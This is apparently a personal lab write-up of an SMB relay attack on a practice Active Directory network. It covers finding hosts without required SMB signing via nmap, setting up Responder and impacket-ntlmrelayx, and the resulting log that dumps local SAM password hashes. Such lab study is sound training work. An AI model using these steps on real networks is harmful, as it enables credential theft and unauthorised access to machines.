#smbrelayattack
#smbsigningdisabled
## SMB Relay Attacks Lab

1. Identify the host without SMB signing enabled
Command: `nmap script=smb2-security-mode.nse -p445 192.168.64.0/24 -Pn | grep not`

`-Pn` - Treats all hosts as online, skipping host discovery. This is useful if you know the host is up but it isn't responding to ICMP echo requests (ping).


Here is the result

- For the domain controller, we cannot take advantage and use the SMb relay attack because **Message signing is enabled and required** 

```
┌──(root㉿kali)-[~]
└─# nmap --script=smb2-security-mode.nse -p445 192.168.64.250 -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-14 16:59 PDT
Nmap scan report for 192.168.64.250
Host is up (0.0060s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 16:91:DE:D1:61:68 (Unknown)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds

```

- For the two domain computers joined to the Domain controller (192.168.64.220 and 192.168.64.221) an SMb relay attack can be executed because **Message signing is enabled but not required**. Please see below

```
┌──(root㉿kali)-[~]
└─# nmap --script=smb2-security-mode.nse -p445 192.168.64.220 -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-14 16:59 PDT
Nmap scan report for 192.168.64.220
Host is up (0.0011s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 4E:4F:0D:0B:16:40 (Unknown)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

┌──(root㉿kali)-[~]
└─# nmap --script=smb2-security-mode.nse -p445 192.168.64.221 -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-14 17:00 PDT
Nmap scan report for 192.168.64.221
Host is up (0.0074s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 8E:27:0F:FF:34:D1 (Unknown)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
 
```


2. After we identified the targets, put it in text file targets.txt

![[Pasted image 20240714202517.png]]

3. Change the responder configuration file to **SMB=OFF and HTTP=OFF**
`sudo mousepad /etc/responder/Responder.conf`

![[Pasted image 20240714202746.png]]

Check if they are off by running the command `sudo responder -I eth0 -dwPv`

4. Setup ntlmrelayx while the responder is running

	- If you have pimpmykali installed, just use ntmrelay
	- If you haven't pimpmykali, you can use the impacket-ntmlrelayx - newer version but not sure if it will work

```
impacket-ntlmrelayx -tf targets.txt smb2support
```

```
┌──(kali㉿kali)-[~]
└─$ impacket-ntlmrelayx -tf targets.txt -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```

Execute the smb


![[Pasted image 20240714210802.png]]

We can't access smb but we captured the logs and has in kali

![[Pasted image 20240714222330.png]]

```
┌──(kali㉿kali)-[~]
└─$ impacket-ntlmrelayx -tf targets.txt -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] Received connection from MARVEL/fcastle at PUNISHER, connection will be relayed after re-authentication
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.64.220 controlled, attacking target smb://192.168.64.220
[*] Authenticating against smb://192.168.64.221 as MARVEL/FCASTLE SUCCEED
[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.64.220 controlled, attacking target smb://192.168.64.220
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[-] Authenticating against smb://192.168.64.220 as MARVEL/FCASTLE FAILED
[*] Target system bootKey: 0xcabc660ecd3b48764bce94bc0b8bf0be
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e7ec10dcc923609de4e827dd59da5683:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:dceeee34db21ea54de36c6a0b88c9843:::
[*] Done dumping SAM hashes for host: 192.168.64.221
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```
